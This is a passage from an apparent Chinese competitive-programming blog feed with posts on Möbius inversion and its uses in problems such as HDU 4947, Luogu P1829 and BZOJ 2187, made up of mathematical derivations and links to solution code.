= &amp; v \cdot [\gcd(\frac{x}{d}, \frac{n}{d}) = 1]\\
\end{aligned}
\]</span></p>
<p>借助莫比乌斯函数性质，有：</p>
<p><span class="math display">\[
\begin{aligned}
\Delta{a}(x) = &amp; \sum\limits_{k \mid \gcd(\frac{x}{d}, \frac{n}{d})} \mu(k) \cdot v \\
= &amp; \sum\limits_{k \mid \frac{x}{d}, k \mid \frac{n}{d}} \mu(k) \cdot v \\
= &amp; \sum\limits_{k \mid \frac{n}{d}} \sum\limits_{kd \mid x} \mu(k) \cdot v \\
\end{aligned}
\]</span></p>
<p>我们注意到，<span class="math inline">\(\sum\limits_{kd \mid x} \mu(k) \cdot v\)</span> 看起来十分类似莫比乌斯反演中的 <span class="math inline">\(F(n)\)</span> 函数。既然如此，我们不妨考虑引入一个辅助数组 <span class="math inline">\(f\)</span>，使其满足：</p>
<p><span class="math display">\[
a(x) = \sum\limits_{k \mid x}f(k)
\]</span></p>
<p>由此一来，我们可以通过维护 <span class="math inline">\(f(x)\)</span> 并通过莫比乌斯反演从而求得 <span class="math inline">\(a(x)\)</span>。</p>
<p>根据上面推导而来的式子，我们不难发现，操作一实则是对于 <span class="math inline">\(\frac{n}{d}\)</span> 的每一个因子 <span class="math inline">\(k\)</span>，向 <span class="math inline">\(f(kd)\)</span> 中增加 <span class="math inline">\(\mu(k) \cdot v\)</span>。</p>
<hr />
<p>而对于操作 <span class="math inline">\(2\)</span>：</p>
<p><span class="math display">\[
\begin{aligned}
\sum\limits_{i = 1}^{x} a(i) = &amp; \sum\limits_{i = 1}^{x}\sum\limits_{k \mid i}f(k) \\
= &amp; \sum\limits_{k = 1}^{x} \left\lfloor \frac{x}{k} \right\rfloor f(k)
\end{aligned}
\]</span></p>
<p>整除分块搞一下就好了…… 由于分块需要快速求出区间和，所以可以考虑使用树状数组维护 <span class="math inline">\(f(x)\)</span>。</p>
<hr />
<p>接下来我们简要分析一下复杂度：</p>
<p>对于操作 <span class="math inline">\(1\)</span>，<span class="math inline">\(\frac{n}{d}\)</span> 分解质因数的复杂度 <span class="math inline">\(\mathcal{O}(\sqrt{N})\)</span>，加上树状数组单点更新后复杂度 <span class="math inline">\(\mathcal{O}(\sqrt{N}\log{N})\)</span>；</p>
<p>对于操作 <span class="math inline">\(2\)</span>，整除分块复杂度 <span class="math inline">\(\mathcal{O}(\sqrt{N})\)</span>，加上树状数组区间查询后复杂度 <span class="math inline">\(\mathcal{O}(\sqrt{N}\log{N})\)</span>。</p>
<p>妙啊！</p>
<p>最后附上 <a href="https://github.com/codgician/Competitive-Programming/blob/master/HDUOJ/4947/mobius_inversion_binary_indexed_tree.cpp">我的代码</a> 以供参考。</p>
</div>
<div id="section" class="section level1">
<h1>%%%</h1>
<ul>
<li>flipped - <a href="https://www.cnblogs.com/flipped/p/HDU4947.html">【HDU4947】GCD Array (莫比乌斯反演+树状数组)</a></li>
</ul>
</div>
]]></content>
		</item>
		
		<item>
			<title>Luogu P1829: Crash 的数字表格</title>
			<link>https://codgician.me/zh-hans/posts/2018/11/luogu-p1829/</link>
			<pubDate>Wed, 21 Nov 2018 19:15:10 +0800</pubDate>
			
			<guid>https://codgician.me/zh-hans/posts/2018/11/luogu-p1829/</guid>
			<description>题面 给定 \(n, m\)，试求： \[ \sum\limits_{i = 1}^{n} \sum\limits_{j = 1}^{m} \operatorname{lcm}(i, j) \] 答案对 \(20101009\) 取模。 数据范围：\(1 \le n,m \le 10^7\) 题目链接：Luogu P1829: Crash 的数字表格 分析 显然我们需要往莫比乌</description>
			<content type="html"><![CDATA[
<script src="/rmarkdown-libs/header-attrs/header-attrs.js"></script>


<div id="题面" class="section level1">
<h1>题面</h1>
<p>给定 <span class="math inline">\(n, m\)</span>，试求：</p>
<p><span class="math display">\[
\sum\limits_{i = 1}^{n} \sum\limits_{j = 1}^{m} \operatorname{lcm}(i, j)
\]</span></p>
<p>答案对 <span class="math inline">\(20101009\)</span> 取模。</p>
<p><strong>数据范围</strong>：<span class="math inline">\(1 \le n,m \le 10^7\)</span></p>
<p><strong>题目链接</strong>：<a href="https://www.luogu.com.cn/problemnew/show/P1829">Luogu P1829: Crash 的数字表格</a></p>
</div>
<div id="分析" class="section level1">
<h1>分析</h1>
<p>显然我们需要往莫比乌斯函数的方向考虑。因此，我们要把 <span class="math inline">\(\operatorname{lcm}(i, j)\)</span> 换作使用 <span class="math inline">\(\gcd(i, j)\)</span> 表示。</p>
<p>为了方便，下文中假设 <span class="math inline">\(n \le m\)</span>（如果 <span class="math inline">\(n &gt; m\)</span> 那么两者交换一下就好了）。</p>
<p><span class="math display">\[
\begin{aligned}
\sum\limits_{i = 1}^{n} \sum\limits_{j = 1}^{m} \operatorname{lcm}(i, j) = &amp; \sum\limits_{i = 1}^{n} \sum\limits_{j = 1}^{m} \frac{ij}{\gcd(i, j)}
\end{aligned}
\]</span></p>
<p>我们发现 <span class="math inline">\(\gcd(i, j)\)</span> 位于分母，这十分不好处理。因此我们在这里介绍一个技巧，令 <span class="math inline">\(\gcd(i, j) = k\)</span> 并枚举 <span class="math inline">\(k\)</span> 从而使得 <span class="math inline">\(\gcd(i, j)\)</span> 离开分母：</p>
<p><span class="math display">\[
\begin{aligned}
\sum\limits_{i = 1}^{n} \sum\limits_{j = 1}^{m} \operatorname{lcm}(i, j) = &amp; \sum\limits_{i = 1}^{n} \sum\limits_{j = 1}^{m} \sum\limits_{k = 1}^{n} \frac{ij}{k} [\gcd(i. j) = k] \\
= &amp; \sum\limits_{k = 1}^{\min(n, m)} \sum\limits_{i = 1}^{\left\lfloor \frac{n}{k} \right\rfloor} \sum\limits_{j = 1}^{\left\lfloor \frac{m}{k} \right\rfloor} ijk[\gcd(i, j) = 1]
\end{aligned}
\]</span></p>
<p>终于出现了我们最喜闻乐见的 <span class="math inline">\([\gcd(i, j) = 1]\)</span>，我们按套路对其进行变换：</p>
<p><span class="math display">\[
\begin{aligned}
\sum\limits_{i = 1}^{n} \sum\limits_{j = 1}^{m} \operatorname{lcm}(i, j) = &amp; \sum\limits_{k = 1}^{n} \sum\limits_{i = 1}^{\left\lfloor \frac{n}{k} \right\rfloor} \sum\limits_{j = 1}^{\left\lfloor \frac{m}{k} \right\rfloor} ijk \sum\limits_{d \mid \gcd(i, j)} \mu(d) \\
= &amp; \sum\limits_{k = 1}^{n} \sum\limits_{i = 1}^{\left\lfloor \frac{n}{k} \right\rfloor} \sum\limits_{j = 1}^{\left\lfloor \frac{m}{k} \right\rfloor} ijk \sum\limits_{d = 1}^{\left\lfloor \frac{n}{k} \right\rfloor} \mu(d) [d  \mid  \gcd(i, j)] \\
= &amp; \sum\limits_{k = 1}^{n} k \sum\limits_{d = 1}^{\left\lfloor \frac{n}{k} \right\rfloor}\mu(d) \sum\limits_{i = 1}^{\left\lfloor \frac{n}{k} \right\rfloor} \sum\limits_{j = 1}^{\left\lfloor \frac{m}{k} \right\rfloor} ij [d  \mid  \gcd(i, j)] \\
= &amp; \sum\limits_{k = 1}^{n} k \sum\limits_{d = 1}^{\left\lfloor \frac{n}{k} \right\rfloor}\mu(d) \sum\limits_{i = 1}^{\left\lfloor \frac{n}{kd} \right\rfloor} \sum\limits_{j = 1}^{\left\lfloor \frac{m}{kd} \right\rfloor} ijd^2 [1  \mid  \gcd(i, j)] \\
= &amp; \sum\limits_{k = 1}^{n}k \sum\limits_{d = 1}^{\left\lfloor \frac{n}{k} \right\rfloor}\mu(d) d^2 \sum\limits_{i = 1}^{\left\lfloor \frac{n}{kd} \right\rfloor}i \sum\limits_{j = 1}^{\left\lfloor \frac{m}{kd} \right\rfloor} j
\end{aligned}
\]</span></p>
<p>我们注意到最后两项实际上都是等差数列求和。我们不妨令 <span class="math inline">\(g(i) = \sum\limits_{i = 1}^{n} i\)</span>，那么有：</p>
<p><span class="math display">\[
\begin{aligned}
\sum\limits_{i = 1}^{n} \sum\limits_{j = 1}^{m} \operatorname{lcm}(i, j) = &amp; \sum\limits_{k = 1}^{n}k \sum\limits_{d = 1}^{\left\lfloor \frac{n}{k} \right\rfloor}\mu(d) d^2 g\left( \left\lfloor \frac{n}{kd} \right\rfloor \right) g\left( \left\lfloor \frac{m}{kd} \right\rfloor \right) \\
\end{aligned}
\]</span></p>
<p>令 <span class="math inline">\(T = kd\)</span>，同时我们考虑枚举 <span class="math inline">\(T\)</span>，则有：</p>
<p><span class="math display">\[
\begin{aligned}
\sum\limits_{i = 1}^{n} \sum\limits_{j = 1}^{m} \operatorname{lcm}(i, j) = &amp; \sum\limits_{k = 1}^{n}k \sum\limits_{d = 1}^{\left\lfloor \frac{n}{k} \right\rfloor}\mu(d) d^2 g\left( \left\lfloor \frac{n}{T} \right\rfloor \right) g\left( \left\lfloor \frac{m}{T} \right\rfloor \right) \\
= &amp; \sum\limits_{T = 1}^{n} g\left( \left\lfloor \frac{n}{T} \right\rfloor \right) g\left( \left\lfloor \frac{m}{T} \right\rfloor \right) \sum\limits_{d \mid T}\mu(d)d^2\frac{T}{d} \\
= &amp; \sum\limits_{T = 1}^{n} g\left( \left\lfloor \frac{n}{T} \right\rfloor \right) g\left( \left\lfloor \frac{m}{T} \right\rfloor \right)T \sum\limits_{d \mid T}d\mu(d)
\end{aligned}
\]</span></p>
<p>不妨令 <span class="math inline">\(F(n) = \sum\limits_{d \mid n} d\mu(d)\)</span> 并对 <span class="math inline">\(F(n)\)</span> 进行研究。</p>
<p>我们发现，当 <span class="math inline">\(a \perp b\)</span> 时（当 <span class="math inline">\(a, b\)</span> 互质时）：</p>
<p><span class="math display">\[
\begin{aligned}
F(a) = &amp; \sum\limits_{d \mid a} d\mu(d) \\
F(b) = &amp; \sum\limits_{d \mid b} d\mu(d) \\
\end{aligned}
\]</span></p>
<p>我们不难发现，由 <span class="math inline">\(a \perp b\)</span>，故 <span class="math inline">\(a\)</span> 和 <span class="math inline">\(b\)</span> 不存在公共因子，因此 <span class="math inline">\(i \mid a, \ j \mid b \Leftrightarrow ij \mid ab\)</span>。又由于 <span class="math inline">\(\mu(n)\)</span> 本身又是积性函数，所以有 <span class="math inline">\(\mu(ab) = \mu(a) \cdot \mu(b)\)</span>。由此：</p>
<p><span class="math display">\[
\begin{aligned}
F(a) \cdot F(b) = &amp; \sum\limits_{i \mid a}i\mu(i)\sum\limits_{j \mid b}j\mu(j) \\
= &amp; \sum\limits_{ij \mid ab}ij \cdot \mu(ij) \\
= &amp; \sum\limits_{k \mid ab}k\mu(k) \\
= &amp; F(ab)
\end{aligned}
\]</span></p>
<p>我们发现 <span class="math inline">\(F(n)\)</span> 也是个积性函数！既然是积性函数…… 那么一定可以线性筛：</p>
<ol style="list-style-type: decimal">
<li><span class="math inline">\(F(1) = 1\)</span>；</li>
<li>若 <span class="math inline">\(a\)</span> 是质数，<span class="math inline">\(F(a) = 1 - a\)</span>；</li>
<li>若 <span class="math inline">\(a \perp b\)</span>，<span class="math inline">\(F(ab) = F(a) \cdot F(b)\)</span>；</li>
</ol>
<p>由此一来，我们就可以 <span class="math inline">\(\mathcal{O}(N)\)</span> 初始化（线性筛 <span class="math inline">\(F(n)\)</span>），并借助整除分块 <span class="math inline">\(\mathcal{O}(\sqrt{N})\)</span> 解决询问了。</p>
<p>最后附上 <a href="https://github.com/codgician/Competitive-Programming/blob/master/Luogu/P1829/mobius_inversion.cpp">我的代码</a> 以供参考。</p>
</div>
<div id="section" class="section level1">
<h1>%%%</h1>
<ul>
<li>An-Amazing-Blog - <a href="https://www.luogu.com.cn/blog/An-Amazing-Blog/mu-bi-wu-si-fan-yan-ji-ge-ji-miao-di-dong-xi">莫比乌斯反演-让我们从基础开始</a></li>
</ul>
</div>
]]></content>
		</item>
		
		<item>
			<title>浅谈莫比乌斯反演</title>
			<link>https://codgician.me/zh-hans/posts/2018/11/mobius-inversion-formula/</link>
			<pubDate>Sun, 18 Nov 2018 13:07:42 +0800</pubDate>
			
			<guid>https://codgician.me/zh-hans/posts/2018/11/mobius-inversion-formula/</guid>
			<description>简介 莫比乌斯函数 定义 性质 莫比乌斯反演 形式 #1 内容 证明 形式 #2 内容 证明 应用 与欧拉函数联系 与最大公约数联系 %%% 简介 最近经常演人/被人演，所以是时候学一</description>
			<content type="html"><![CDATA[
<script src="/rmarkdown-libs/header-attrs/header-attrs.js"></script>

<div id="TOC">
<ul>
<li><a href="#简介">简介</a></li>
<li><a href="#莫比乌斯函数">莫比乌斯函数</a>
<ul>
<li><a href="#定义">定义</a></li>
<li><a href="#性质">性质</a></li>
</ul></li>
<li><a href="#莫比乌斯反演">莫比乌斯反演</a>
<ul>
<li><a href="#形式-1">形式 #1</a>
<ul>
<li><a href="#内容">内容</a></li>
<li><a href="#证明">证明</a></li>
</ul></li>
<li><a href="#形式-2">形式 #2</a>
<ul>
<li><a href="#内容-1">内容</a></li>
<li><a href="#证明-1">证明</a></li>
</ul></li>
</ul></li>
<li><a href="#应用">应用</a>
<ul>
<li><a href="#与欧拉函数联系">与欧拉函数联系</a></li>
<li><a href="#与最大公约数联系">与最大公约数联系</a></li>
</ul></li>
<li><a href="#section">%%%</a></li>
</ul>
</div>

<div id="简介" class="section level1">
<h1>简介</h1>
<p><del>最近经常演人/被人演，所以是时候学一学反演了。</del></p>
<p>本文会从初等数论角度介绍 <em>莫比乌斯反演公式 (Mobius inversion formula)</em>，不过如果我们借助一点抽象代数知识引入 <em>狄利克雷卷积 (Dirichlet convolution)</em> 的话便能得到更加优雅的推导~ 因此强烈安利另一篇姊妹博文：<a href="/zh-hans/posts/2019/08/arithmetic-function-and-dirichlet-convolution/">数论函数与狄利克雷卷积</a>。</p>
</div>
<div id="莫比乌斯函数" class="section level1">
<h1>莫比乌斯函数</h1>
<div id="定义" class="section level2">
<h2>定义</h2>
<p>对于正整数 <span class="math inline">\(n\)</span>，若对其分解质因数有 <span class="math inline">\(n = p_1^{c_1} p_2^{c_2} \dots p_k^{c_k} \ (c_i &gt; 0)\)</span>，则：</p>
<p><span class="math display">\[
\mu(n) =
\begin{cases}
1 &amp; n = 1 \\
0 &amp; \exists c_i &gt; 1 \\
(-1)^k &amp; \text{otherwise}
\end{cases}
\]</span></p>
<p>通俗地来讲，当 <span class="math inline">\(n = 1\)</span> 时，<span class="math inline">\(\mu(n) = 1\)</span>；当 <span class="math inline">\(n\)</span> 的因子中存在完全平方数时，<span class="math inline">\(\mu(n) = 0\)</span>。对于剩余情况，也就是对 <span class="math inline">\(n\)</span> 质因数分解可得到 <span class="math inline">\(n = p_1p_2 \dots p_k\)</span> 的情况，<span class="math inline">\(\mu(n) = (-1)^k\)</span>，即 <span class="math inline">\(\mu(n)\)</span> 的值取决于 <span class="math inline">\(n\)</span> 不同质因数的个数。</p>
<p>不难发现，若 <span class="math inline">\(a, b\)</span> 互质，则有 <span class="math inline">\(\mu(ab) = \mu(a)\mu(b)\)</span>。根据线性筛那一套理论，我们可以很容易地筛出 <span class="math inline">\(\mu\)</span>。</p>
</div>
<div id="性质" class="section level2">
<h2>性质</h2>
<p><span class="math display">\[
\sum\limits_{d \mid n} \mu(d) =
\begin{cases}
1 &amp; n = 1\\
0 &amp; \text{otherwise} \\
\end{cases}
\]</span></p>
<p>下面给出简要证明：</p>
<ol style="list-style-type: decimal">
<li><span class="math inline">\(n = 1\)</span> 时，显然有 <span class="math inline">\(\sum\limits_{d \mid n} \mu(d) = 1\)</span>；</li>
<li><span class="math inline">\(n \neq 1\)</span> 时，有 <span class="math inline">\(k &gt; 0\)</span>。记 <span class="math inline">\(n = p_1^{c_1}p_2^{c_2} \dots p_k^{c_k} \ (c_i &gt; 0)\)</span>。对于 <span class="math inline">\(d \mid n\)</span>，<span class="math inline">\(\mu(d) \neq 0\)</span> 当且仅当 <span class="math inline">\(d\)</span> 中不存在完全平方数因子。显然，具有 <span class="math inline">\(i\)</span> 个质因数的 <span class="math inline">\(d\)</span> 有 <span class="math inline">\(\binom{k}{i}\)</span> 个。因此，<span class="math inline">\(\sum\limits_{d \mid n} \mu(d) = \sum\limits_{i = 0}^{k} (-1)^k\binom{k}{i}\)</span>。我们不难观察发现，这个式子就是一个二项式展开，即 <span class="math inline">\((1 - 1)^k\)</span>，故其值为 <span class="math inline">\(0\)</span>。</li>
</ol>
</div>
</div>
<div id="莫比乌斯反演" class="section level1">
<h1>莫比乌斯反演</h1>
<div id="形式-1" class="section level2">
<h2>形式 #1</h2>
<div id="内容" class="section level3">
<h3>内容</h3>
<p>定义 <span class="math inline">\(F(n), f(n)\)</span> 均为非负整数集合上的两个函数，则有：</p>
<p><span class="math display">\[
F(n) = \sum\limits_{d \mid n}f(d) \Leftrightarrow f(n) = \sum\limits_{d \mid n} \mu(d)F(\frac{n}{d})
\]</span></p>
<p>简而言之，利用莫比乌斯反演，只要我们知道 <span class="math inline">\(F(n)\)</span> 或是 <span class="math inline">\(f(n)\)</span> 中一者的定义，就可以推知另一者的具体定义。</p>
</div>
<div id="证明" class="section level3">
<h3>证明</h3>
<p>下面我们给出莫比乌斯反演的一种简要证明：</p>
<p><span class="math display">\[
\begin{aligned}
\sum\limits_{d \mid n} \mu(d)F(\frac{n}{d}) = &amp; \sum\limits_{d \mid n} \mu(d) \sum\limits_{k \mid \frac{n}{d}} f(k) \\
= &amp; \sum\limits_{k \mid n} f(k) \sum\limits_{d \mid \frac{n}{k}} \mu(d) \\
\end{aligned}
\]</span></p>
<p>由前文提到的性质，当且仅当 <span class="math inline">\(\frac{n}{k} = 1\)</span> 时 <span class="math inline">\(\sum\limits_{d \mid \frac{n}{k}} \mu(d) = 1\)</span>；否则该式值为 <span class="math inline">\(0\)</span>。所以：</p>
<p><span class="math display">\[
\begin{aligned}
\sum\limits_{d \mid n} \mu(d)F(\frac{n}{d}) = f(k)
\end{aligned}
\]</span></p>
<p>得证。</p>
</div>
</div>
<div id="形式-2" class="section level2">
<h2>形式 #2</h2>
<div id="内容-1" class="section level3">
<h3>内容</h3>
<p>定义 <span class="math inline">\(F(n), f(n)\)</span> 均为非负整数集合上的两个函数，则有：</p>
<p><span class="math display">\[
F(n) = \sum\limits_{n \mid d}f(d) \Leftrightarrow f(n) = \sum\limits_{n \mid d} \mu(\frac{d}{n})F(d)
\]</span></p>
<p>注意这一形式与上一形式最大的不同点，即求和条件由 <span class="math inline">\(d \mid n\)</span> 变为 <span class="math inline">\(n \mid d\)</span>。</p>
</div>
<div id="证明-1" class="section level3">
<h3>证明</h3>
<p>令 <span class="math inline">\(t = \frac{d}{n}\)</span>，有：</p>
<p><span class="math display">\[
\begin{aligned}
\sum\limits_{n \mid d} \mu(\frac{d}{n})F(d) = &amp; \sum\limits_{t = 1}^{+\infty}\mu(t)F(nt) \\
= &amp; \sum\limits_{t = 1}^{+\infty}\mu(t)\sum\limits_{nt \mid k}f(k) \\
= &amp; \sum\limits_{n \mid k}f(k)\sum\limits_{t \mid \frac{k}{n}}\mu(t)
\end{aligned}
\]</span></p>
<p>由前文提到的性质，当且仅当 <span class="math inline">\(\frac{k}{n} = 1\)</span> 时 <span class="math inline">\(\sum\limits_{t \mid \frac{k}{n}}\mu(t) = 1\)</span>，否则该式值为 <span class="math inline">\(0\)</span>。所以：</p>
<p><span class="math display">\[
\sum\limits_{n \mid d} \mu(\frac{d}{n})F(d) = f(n)
\]</span></p>
</div>
</div>
</div>
<div id="应用" class="section level1">
<h1>应用</h1>
<p>当 <span class="math inline">\(F(n)\)</span> 和 <span class="math inline">\(f(n)\)</span> 中一者容易求得，而另一着不易求得时，我们可以借助莫比乌斯反演来求得不易求得的函数。</p>
<div id="与欧拉函数联系" class="section level2">
<h2>与欧拉函数联系</h2>
<p>这里我们尝试应用一下莫比乌斯反演来推导莫比乌斯函数 <span class="math inline">\(\mu(n)\)</span> 与欧拉函数 <span class="math inline">\(\varphi(n)\)</span> 间的关系。</p>
<p>首先欧拉函数有一个性质：</p>
<p><span class="math display">\[
\sum\limits_{d \mid n} \varphi(d) = n
\]</span></p>
<p>那么我们不妨令 <span class="math inline">\(F(n) = \sum\limits_{d \mid n} \varphi(d) = n\)</span>，运用莫比乌斯反演可得：</p>
<p><span class="math display">\[
\begin{aligned}
\varphi(n) = &amp; \sum\limits_{d \mid n} \mu(d)F(\frac{n}{d}) \\
= &amp; \sum\limits_{d \mid n} \mu(d) \cdot \frac{n}{d}
\end{aligned}
\]</span></p>
<p>整理后可得：</p>
<p><span class="math display">\[
\sum\limits_{d \mid n} \frac{\mu(d)}{d} = \frac{\varphi(n)}{n}
\]</span></p>
<p>注：其实这个结论也可以利用 <span class="math inline">\(\varphi(n)\)</span> 的计算公式加上容斥原理得出，而在其过程中，实际上容斥系数就是 <span class="math inline">\(\mu(d)\)</span>。</p>
</div>
<div id="与最大公约数联系" class="section level2">
<h2>与最大公约数联系</h2>
<p>给定 <span class="math inline">\(n, m\)</span>，求满足 <span class="math inline">\(1 \le i \le n, \ 1 \le j \le m, \ \gcd(i, j) = 1\)</span> 的数对 <span class="math inline">\(\langle i, j \rangle\)</span> 个数（其中 <span class="math inline">\(\langle a, b \rangle\)</span> 和 <span class="math inline">\(\langle b, a \rangle\)</span> 算两个不同的数对）。</p>
<p>换言之，即求：</p>
<p><span class="math display">\[
\sum\limits_{i = 1}^{n}\sum\limits_{j = 1}^{m} [\gcd(i, j) = 1]
\]</span></p>
<p>暴力的做法显然复杂度是 <span class="math inline">\(\mathcal{O}(n^2)\)</span> 级别的。</p>
<p>我们可以考虑利用莫比乌斯函数的性质：</p>
<p><span class="math display">\[
\begin{aligned}
\sum\limits_{i = 1}^{n}\sum\limits_{j = 1}^{m} [\gcd(i, j) = 1] = &amp; \sum\limits_{i = 1}^{n}\sum\limits_{j = 1}^{m}\sum\limits_{d \mid \gcd(i, j)}\mu(d) \\
= &amp; \sum\limits_{d = 1}^{\min(n, m)}\mu(d) \sum\limits_{i = 1}^{n}\sum\limits_{j = 1}^{m} [d  \mid  \gcd(i, j)] \\
= &amp; \sum\limits_{d = 1}^{\min(n, m)} \mu(d)\left\lfloor \frac{n}{d} \right\rfloor \left\lfloor \frac{m}{d} \right\rfloor
\end{aligned}
\]</span></p>
<p>我们可以用线性筛以 <span class="math inline">\(\mathcal{O}(N)\)</span> 的复杂度预处理出 <span class="math inline">\(\mu(n)\)</span> 的前缀和从而能够 <span class="math inline">\(\mathcal{O}(1)\)</span> 回答 <span class="math inline">\(\mu(n)\)</span> 的区间和。而面对询问时，我们可以用 <span class="math inline">\(\mathcal{O}(\sqrt{N})\)</span> 的复杂度进行整除分块并进行求解。</p>
<hr />
<p>那么如果我们要求的是 <span class="math inline">\(\gcd(i, j) = k\)</span> 怎么办？我们仅需做如下变换：</p>
<p><span class="math display">\[
\sum\limits_{i = 1}^{n}\sum\limits_{j = 1}^{m} [\gcd(i, j) = k] = \sum\limits_{i = 1}^{\left\lfloor \frac{n}{k} \right\rfloor}\sum\limits_{j = 1}^{\left\lfloor \frac{m}{k} \right\rfloor} [\gcd(i, j) = 1]
\]</span></p>
<p>接下来就跟之前的做法一样咯，所以我们能得到：</p>
<p><span class="math display">\[
Ans = \sum\limits_{d = 1}^{\min(\left\lfloor \frac{n}{k} \right\rfloor, \left\lfloor \frac{m}{k} \right\rfloor)} \mu(d) \left\lfloor \frac{n}{kd} \right\rfloor \left\lfloor \frac{m}{kd} \right\rfloor
\]</span></p>
<hr />
<p>当然，我们也可以向莫比乌斯反演的的方向进行考虑。</p>
<p>我们不妨记 <span class="math inline">\(f(k)\)</span> 代表满足 <span class="math inline">\(\gcd(i, j) = k\)</span> 的 <span class="math inline">\(\langle i, j \rangle\)</span> 对个数。那么 <span class="math inline">\(F(k) = \sum\limits_{k \mid d}f(d)\)</span> 的意义即为满足
<span class="math inline">\(k \mid \gcd(i, j)\)</span> 的 <span class="math inline">\(\langle i, j \rangle\)</span> 对数。而求满足 <span class="math inline">\(1 \le i \le n, \ 1 \le j \le m\)</span> 范围内 <span class="math inline">\(k \mid \gcd(i, j)\)</span> 这一条件的对数显然等价于 <span class="math inline">\(1 \le i \le \left\lfloor \frac{n}{k} \right\rfloor, \ 1 \le j \le \left\lfloor \frac{m}{k} \right\rfloor\)</span> 范围内 <span class="math inline">\(1 \mid \gcd(i, j)\)</span> 的对数（显然在此范围内的所有数对都满足这一条件）。由此我们可以很容易得到 <span class="math inline">\(F(k)\)</span> 的具体定义：</p>
<p><span class="math display">\[
F(k) = \left\lfloor \frac{n}{k} \right\rfloor \left\lfloor \frac{m}{k} \right\rfloor
\]</span></p>
<p>接下来我们就可以利用莫比乌斯反演直接得到 <span class="math inline">\(f(k)\)</span> 的具体定义了：</p>
<p><span class="math display">\[
\begin{aligned}
f(k) = &amp; \sum\limits_{k \mid d} \mu(\frac{d}{k})F(d) \\
= &amp; \sum\limits_{k \mid d} \mu(\frac{d}{k}) \left\lfloor \frac{n}{d} \right\rfloor \left\lfloor \frac{m}{d} \right\rfloor \\
\end{aligned}
\]</span></p>
<p>不妨令 <span class="math inline">\(t = \frac{d}{k}\)</span>，我们便得到了跟之前一样的结果：</p>
<p><span class="math display">\[
f(k) = \sum\limits_{t = 1}^{\min(\left\lfloor \frac{n}{k} \right\rfloor, \left\lfloor \frac{m}{k} \right\rfloor)} \mu(t) \left\lfloor \frac{n}{tk} \right\rfloor \left\lfloor \frac{m}{tk} \right\rfloor
\]</span></p>
<p>至于更多的应用，强烈安利这篇博文： <a href="https://www.luogu.com.cn/blog/An-Amazing-Blog/mu-bi-wu-si-fan-yan-ji-ge-ji-miao-di-dong-xi">莫比乌斯反演-让我们从基础开始</a>。</p>
</div>
</div>
<div id="section" class="section level1">
<h1>%%%</h1>
<ul>
<li>Ronald L. Graham, Donald E. Knuth, Oren Patashnik - Concrete Mathematics, Second Edition</li>
<li>peng-ym - <a href="https://www.cnblogs.com/peng-ym/p/8647856.html">莫比乌斯反演</a></li>
<li>outer_form - <a href="https://blog.csdn.net/outer_form/article/details/50588307">莫比乌斯反演定理证明（两种形式）</a></li>
<li>An-Amazing-Blog - <a href="https://www.luogu.com.cn/blog/An-Amazing-Blog/mu-bi-wu-si-fan-yan-ji-ge-ji-miao-di-dong-xi">莫比乌斯反演-让我们从基础开始</a></li>
</ul>
</div>
]]></content>
		</item>
		
		<item>
			<title>BZOJ 2187: fraction</title>
			<link>https://codgician.me/zh-hans/posts/2018/10/bzoj-2187/</link>
			<pubDate>Sun, 28 Oct 2018 22:30:27 +0800</pubDate>
			
			<guid>https://codgician.me/zh-hans/posts/2018/10/bzoj-2187/</guid>
			<description>题面 分析 题面 给定四个正整数 \(a, b, c, d\)，试求最简正分数 \(\frac{p}{q}\)，满足： \[ \frac{a}{b} &amp;lt; \frac{p}{q} &amp;lt; \frac{c}{d} \] 若有多组解，取 \(q\) 最小的一组解；若仍</description>
			<content type="html"><![CDATA[
<script src="/rmarkdown-libs/header-attrs/header-attrs.js"></script>

<div id="TOC">
<ul>
<li><a href="#题面">题面</a></li>
<li><a href="#分析">分析</a></li>
</ul>
</div>

<div id="题面" class="section level1">
<h1>题面</h1>
<p>给定四个正整数 <span class="math inline">\(a, b, c, d\)</span>，试求最简正分数 <span class="math inline">\(\frac{p}{q}\)</span>，满足：</p>
<p><span class="math display">\[
\frac{a}{b} &lt; \frac{p}{q} &lt; \frac{c}{d}
\]</span></p>
<p>若有多组解，取 <span class="math inline">\(q\)</span> 最小的一组解；若仍有多组解，取 <span class="math inline">\(p\)</span> 最小的一组解。</p>
<p><strong>数据范围</strong>：<span class="math inline">\(1 \le a, b, c, d \le 10^9\)</span>，数据组数 <span class="math inline">\(T \le 500\)</span>，保证一定有解。</p>
<p><strong>题目链接</strong>：<a href="https://darkbzoj.tk/problem/2187">BZOJ 2187: fraction</a></p>
</div>
<div id="分析" class="section level1">
<h1>分析</h1>
<p>我们记原问题的解为 <span class="math inline">\(f(a, b, c, d) = \langle p, q \rangle\)</span>。</p>
<p>我们先来讨论两种可以直接得出答案的情况。</p>
<p>首先，如果 <span class="math inline">\(\frac{a}{b}\)</span> 和 <span class="math inline">\(\frac{c}{d}\)</span> 间存在正整数，那么显然取 <span class="math inline">\(q = 1\)</span>。</p>
<p>正式地说，如果满足：</p>
<p><span class="math display">\[
\begin{cases}
\left\lfloor \frac{c}{d} \right\rfloor - \left\lfloor \frac{a}{b} \right\rfloor \ge 1 &amp; c \not\equiv 0 \pmod d \\
\frac{c}{d} - 1 - \left\lfloor \frac{a}{b} \right\rfloor \ge 1 &amp; c \equiv 0 \pmod d
\end{cases}
\]</span></p>
<p>那么我们取 <span class="math inline">\(p = \left\lfloor \frac{a}{b} \right\rfloor + 1, q = 1\)</span> 为解。</p>
<p>其次，如果 <span class="math inline">\(a = 0\)</span>（虽然本题中不会直接出现这一情况，但我们需要解决的子问题中可能会出现），那么很显然我们可以取 <span class="math inline">\(p = 1, q = \left\lfloor \frac{c}{d} \right\rfloor + 1\)</span> 为解。</p>
<hr />
<p>对于剩下不能直接得出答案的情况，我们可以考虑将问题逐步转化至上面可直接得解的情况从而递归地求解。</p>
<p>若 <span class="math inline">\(a \le b\)</span> 且 <span class="math inline">\(c \le d\)</span> ，我们可以考虑对问题进行转换：</p>
<p><span class="math display">\[
\frac{a}{b} &lt; \frac{p}{q} &lt; \frac{c}{d} \Rightarrow \frac{d}{c} &lt; \frac{q}{p} &lt; \frac{b}{a}
\]</span></p>
<p>我们对子问题 <span class="math inline">\(f(d, c, b, a) = \langle p&#39;, q&#39; \rangle\)</span> 进行求解，并在回溯的时候令 <span class="math inline">\(p = q&#39;, q = p&#39;\)</span> 即可。</p>
